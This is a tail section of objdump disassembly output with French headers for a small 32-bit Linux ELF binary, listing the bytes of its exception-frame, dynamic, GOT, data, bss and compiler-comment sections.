    209c:	b8 00 00 00 1c       	mov    $0x1c000000,%eax
    20a1:	f2 ff                	repnz (bad) 
    20a3:	ff                   	(bad)  
    20a4:	fc                   	cld    
    20a5:	00 00                	add    %al,(%eax)
    20a7:	00 7c f2 ff          	add    %bh,-0x1(%edx,%esi,8)
    20ab:	ff 48 01             	decl   0x1(%eax)
	...

Déassemblage de la section .eh_frame :

000020b0 <__FRAME_END__-0x120>:
    20b0:	14 00                	adc    $0x0,%al
    20b2:	00 00                	add    %al,(%eax)
    20b4:	00 00                	add    %al,(%eax)
    20b6:	00 00                	add    %al,(%eax)
    20b8:	01 7a 52             	add    %edi,0x52(%edx)
    20bb:	00 01                	add    %al,(%ecx)
    20bd:	7c 08                	jl     20c7 <__GNU_EH_FRAME_HDR+0x53>
    20bf:	01 1b                	add    %ebx,(%ebx)
    20c1:	0c 04                	or     $0x4,%al
    20c3:	04 88                	add    $0x88,%al
    20c5:	01 07                	add    %eax,(%edi)
    20c7:	08 10                	or     %dl,(%eax)
    20c9:	00 00                	add    %al,(%eax)
    20cb:	00 1c 00             	add    %bl,(%eax,%eax,1)
    20ce:	00 00                	add    %al,(%eax)
    20d0:	b0 ef                	mov    $0xef,%al
    20d2:	ff                   	(bad)  
    20d3:	ff 36                	pushl  (%esi)
    20d5:	00 00                	add    %al,(%eax)
    20d7:	00 00                	add    %al,(%eax)
    20d9:	00 00                	add    %al,(%eax)
    20db:	00 14 00             	add    %dl,(%eax,%eax,1)
    20de:	00 00                	add    %al,(%eax)
    20e0:	00 00                	add    %al,(%eax)
    20e2:	00 00                	add    %al,(%eax)
    20e4:	01 7a 52             	add    %edi,0x52(%edx)
    20e7:	00 01                	add    %al,(%ecx)
    20e9:	7c 08                	jl     20f3 <__GNU_EH_FRAME_HDR+0x7f>
    20eb:	01 1b                	add    %ebx,(%ebx)
    20ed:	0c 04                	or     $0x4,%al
    20ef:	04 88                	add    $0x88,%al
    20f1:	01 00                	add    %eax,(%eax)
    20f3:	00 20                	add    %ah,(%eax)
    20f5:	00 00                	add    %al,(%eax)
    20f7:	00 1c 00             	add    %bl,(%eax,%eax,1)
    20fa:	00 00                	add    %al,(%eax)
    20fc:	24 ef                	and    $0xef,%al
    20fe:	ff                   	(bad)  
    20ff:	ff 50 00             	call   *0x0(%eax)
    2102:	00 00                	add    %al,(%eax)
    2104:	00 0e                	add    %cl,(%esi)
    2106:	08 46 0e             	or     %al,0xe(%esi)
    2109:	0c 4a                	or     $0x4a,%al
    210b:	0f 0b                	ud2    
    210d:	74 04                	je     2113 <__GNU_EH_FRAME_HDR+0x9f>
    210f:	78 00                	js     2111 <__GNU_EH_FRAME_HDR+0x9d>
    2111:	3f                   	aas    
    2112:	1a 3b                	sbb    (%ebx),%bh
    2114:	2a 32                	sub    (%edx),%dh
    2116:	24 22                	and    $0x22,%al
    2118:	10 00                	adc    %al,(%eax)
    211a:	00 00                	add    %al,(%eax)
    211c:	40                   	inc    %eax
    211d:	00 00                	add    %al,(%eax)
    211f:	00 50 ef             	add    %dl,-0x11(%eax)
    2122:	ff                   	(bad)  
    2123:	ff 08                	decl   (%eax)
    2125:	00 00                	add    %al,(%eax)
    2127:	00 00                	add    %al,(%eax)
    2129:	00 00                	add    %al,(%eax)
    212b:	00 40 00             	add    %al,0x0(%eax)
    212e:	00 00                	add    %al,(%eax)
    2130:	54                   	push   %esp
    2131:	00 00                	add    %al,(%eax)
    2133:	00 85 f0 ff ff d6    	add    %al,-0x29000010(%ebp)
    2139:	00 00                	add    %al,(%eax)
    213b:	00 00                	add    %al,(%eax)
    213d:	44                   	inc    %esp
    213e:	0c 01                	or     $0x1,%al
    2140:	00 47 10             	add    %al,0x10(%edi)
    2143:	05 02 75 00 46       	add    $0x46007502,%eax
    2148:	0f 03 75 70          	lsl    0x70(%ebp),%esi
    214c:	06                   	push   %es
    214d:	10 07                	adc    %al,(%edi)
    214f:	02 75 7c             	add    0x7c(%ebp),%dh
    2152:	10 06                	adc    %al,(%esi)
    2154:	02 75 78             	add    0x78(%ebp),%dh
    2157:	10 03                	adc    %al,(%ebx)
    2159:	02 75 74             	add    0x74(%ebp),%dh
    215c:	02 bd c1 0c 01 00    	add    0x10cc1(%ebp),%bh
    2162:	41                   	inc    %ecx
    2163:	c3                   	ret    
    2164:	41                   	inc    %ecx
    2165:	c6 41 c7 41          	movb   $0x41,-0x39(%ecx)
    2169:	c5 43 0c             	lds    0xc(%ebx),%eax
    216c:	04 04                	add    $0x4,%al
    216e:	00 00                	add    %al,(%eax)
    2170:	48                   	dec    %eax
    2171:	00 00                	add    %al,(%eax)
    2173:	00 98 00 00 00 18    	add    %bl,0x18000000(%eax)
    2179:	f1                   	icebp  
    217a:	ff                   	(bad)  
    217b:	ff 55 00             	call   *0x0(%ebp)
    217e:	00 00                	add    %al,(%eax)
    2180:	00 41 0e             	add    %al,0xe(%ecx)
    2183:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
    2189:	87 03                	xchg   %eax,(%ebx)
    218b:	41                   	inc    %ecx
    218c:	0e                   	push   %cs
    218d:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
    2193:	83 05 4e 0e 20 61 0e 	addl   $0xe,0x61200e4e
    219a:	24 41                	and    $0x41,%al
    219c:	0e                   	push   %cs
    219d:	28 44 0e 2c          	sub    %al,0x2c(%esi,%ecx,1)
    21a1:	44                   	inc    %esp
    21a2:	0e                   	push   %cs
    21a3:	30 4d 0e             	xor    %cl,0xe(%ebp)
    21a6:	20 47 0e             	and    %al,0xe(%edi)
    21a9:	14 41                	adc    $0x41,%al
    21ab:	c3                   	ret    
    21ac:	0e                   	push   %cs
    21ad:	10 41 c6             	adc    %al,-0x3a(%ecx)
    21b0:	0e                   	push   %cs
    21b1:	0c 41                	or     $0x41,%al
    21b3:	c7                   	(bad)  
    21b4:	0e                   	push   %cs
    21b5:	08 41 c5             	or     %al,-0x3b(%ecx)
    21b8:	0e                   	push   %cs
    21b9:	04 00                	add    $0x0,%al
    21bb:	00 10                	add    %dl,(%eax)
    21bd:	00 00                	add    %al,(%eax)
    21bf:	00 e4                	add    %ah,%ah
    21c1:	00 00                	add    %al,(%eax)
    21c3:	00 2c f1             	add    %ch,(%ecx,%esi,8)
    21c6:	ff                   	(bad)  
    21c7:	ff 01                	incl   (%ecx)
    21c9:	00 00                	add    %al,(%eax)
    21cb:	00 00                	add    %al,(%eax)
    21cd:	00 00                	add    %al,(%eax)
	...

000021d0 <__FRAME_END__>:
    21d0:	00 00                	add    %al,(%eax)
	...

Déassemblage de la section .init_array :

00003ef4 <__frame_dummy_init_array_entry>:
    3ef4:	b0 11                	mov    $0x11,%al
	...

Déassemblage de la section .fini_array :

00003ef8 <__do_global_dtors_aux_fini_array_entry>:
    3ef8:	60                   	pusha  
    3ef9:	11 00                	adc    %eax,(%eax)
	...

Déassemblage de la section .dynamic :

00003efc <_DYNAMIC>:
    3efc:	01 00                	add    %eax,(%eax)
    3efe:	00 00                	add    %al,(%eax)
    3f00:	01 00                	add    %eax,(%eax)
    3f02:	00 00                	add    %al,(%eax)
    3f04:	0c 00                	or     $0x0,%al
    3f06:	00 00                	add    %al,(%eax)
    3f08:	00 10                	add    %dl,(%eax)
    3f0a:	00 00                	add    %al,(%eax)
    3f0c:	0d 00 00 00 f4       	or     $0xf4000000,%eax
    3f11:	12 00                	adc    (%eax),%al
    3f13:	00 19                	add    %bl,(%ecx)
    3f15:	00 00                	add    %al,(%eax)
    3f17:	00 f4                	add    %dh,%ah
    3f19:	3e 00 00             	add    %al,%ds:(%eax)
    3f1c:	1b 00                	sbb    (%eax),%eax
    3f1e:	00 00                	add    %al,(%eax)
    3f20:	04 00                	add    $0x0,%al
    3f22:	00 00                	add    %al,(%eax)
    3f24:	1a 00                	sbb    (%eax),%al
    3f26:	00 00                	add    %al,(%eax)
    3f28:	f8                   	clc    
    3f29:	3e 00 00             	add    %al,%ds:(%eax)
    3f2c:	1c 00                	sbb    $0x0,%al
    3f2e:	00 00                	add    %al,(%eax)
    3f30:	04 00                	add    $0x0,%al
    3f32:	00 00                	add    %al,(%eax)
    3f34:	f5                   	cmc    
    3f35:	fe                   	(bad)  
    3f36:	ff 6f ec             	ljmp   *-0x14(%edi)
    3f39:	01 00                	add    %eax,(%eax)
    3f3b:	00 05 00 00 00 ac    	add    %al,0xac000000
    3f41:	02 00                	add    (%eax),%al
    3f43:	00 06                	add    %al,(%esi)
    3f45:	00 00                	add    %al,(%eax)
    3f47:	00 0c 02             	add    %cl,(%edx,%eax,1)
    3f4a:	00 00                	add    %al,(%eax)
    3f4c:	0a 00                	or     (%eax),%al
    3f4e:	00 00                	add    %al,(%eax)
    3f50:	a9 00 00 00 0b       	test   $0xb000000,%eax
    3f55:	00 00                	add    %al,(%eax)
    3f57:	00 10                	add    %dl,(%eax)
    3f59:	00 00                	add    %al,(%eax)
    3f5b:	00 15 00 00 00 00    	add    %dl,0x0
    3f61:	00 00                	add    %al,(%eax)
    3f63:	00 03                	add    %al,(%ebx)
    3f65:	00 00                	add    %al,(%eax)
    3f67:	00 00                	add    %al,(%eax)
    3f69:	40                   	inc    %eax
    3f6a:	00 00                	add    %al,(%eax)
    3f6c:	02 00                	add    (%eax),%al
    3f6e:	00 00                	add    %al,(%eax)
    3f70:	20 00                	and    %al,(%eax)
    3f72:	00 00                	add    %al,(%eax)
    3f74:	14 00                	adc    $0x0,%al
    3f76:	00 00                	add    %al,(%eax)
    3f78:	11 00                	adc    %eax,(%eax)
    3f7a:	00 00                	add    %al,(%eax)
    3f7c:	17                   	pop    %ss
    3f7d:	00 00                	add    %al,(%eax)
    3f7f:	00 dc                	add    %bl,%ah
    3f81:	03 00                	add    (%eax),%eax
    3f83:	00 11                	add    %dl,(%ecx)
    3f85:	00 00                	add    %al,(%eax)
    3f87:	00 9c 03 00 00 12 00 	add    %bl,0x120000(%ebx,%eax,1)
    3f8e:	00 00                	add    %al,(%eax)
    3f90:	40                   	inc    %eax
    3f91:	00 00                	add    %al,(%eax)
    3f93:	00 13                	add    %dl,(%ebx)
    3f95:	00 00                	add    %al,(%eax)
    3f97:	00 08                	add    %cl,(%eax)
    3f99:	00 00                	add    %al,(%eax)
    3f9b:	00 fb                	add    %bh,%bl
    3f9d:	ff                   	(bad)  
    3f9e:	ff 6f 00             	ljmp   *0x0(%edi)
    3fa1:	00 00                	add    %al,(%eax)
    3fa3:	08 fe                	or     %bh,%dh
    3fa5:	ff                   	(bad)  
    3fa6:	ff 6f 6c             	ljmp   *0x6c(%edi)
    3fa9:	03 00                	add    (%eax),%eax
    3fab:	00 ff                	add    %bh,%bh
    3fad:	ff                   	(bad)  
    3fae:	ff 6f 01             	ljmp   *0x1(%edi)
    3fb1:	00 00                	add    %al,(%eax)
    3fb3:	00 f0                	add    %dh,%al
    3fb5:	ff                   	(bad)  
    3fb6:	ff 6f 56             	ljmp   *0x56(%edi)
    3fb9:	03 00                	add    (%eax),%eax
    3fbb:	00 fa                	add    %bh,%dl
    3fbd:	ff                   	(bad)  
    3fbe:	ff 6f 04             	ljmp   *0x4(%edi)
	...

Déassemblage de la section .got :

00003fec <.got>:
	...
    3ff8:	b9 11 00 00 00       	mov    $0x11,%ecx
    3ffd:	00 00                	add    %al,(%eax)
	...

Déassemblage de la section .got.plt :

00004000 <_GLOBAL_OFFSET_TABLE_>:
    4000:	fc                   	cld    
    4001:	3e 00 00             	add    %al,%ds:(%eax)
	...
    400c:	36 10 00             	adc    %al,%ss:(%eax)
    400f:	00 46 10             	add    %al,0x10(%esi)
    4012:	00 00                	add    %al,(%eax)
    4014:	56                   	push   %esi
    4015:	10 00                	adc    %al,(%eax)
    4017:	00 66 10             	add    %ah,0x10(%esi)
	...

Déassemblage de la section .data :

0000401c <__data_start>:
    401c:	00 00                	add    %al,(%eax)
	...

00004020 <__dso_handle>:
    4020:	20 40 00             	and    %al,0x0(%eax)
	...

Déassemblage de la section .bss :

00004024 <__bss_start>:
    4024:	00 00                	add    %al,(%eax)
	...

Déassemblage de la section .comment :

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 44 65 62          	sub    %al,0x62(%ebp,%eiz,2)
   9:	69 61 6e 20 38 2e 33 	imul   $0x332e3820,0x6e(%ecx),%esp
  10:	2e 30 2d 36 29 20 38 	xor    %ch,%cs:0x38202936
  17:	2e 33 2e             	xor    %cs:(%esi),%ebp
  1a:	30 00                	xor    %al,(%eax)
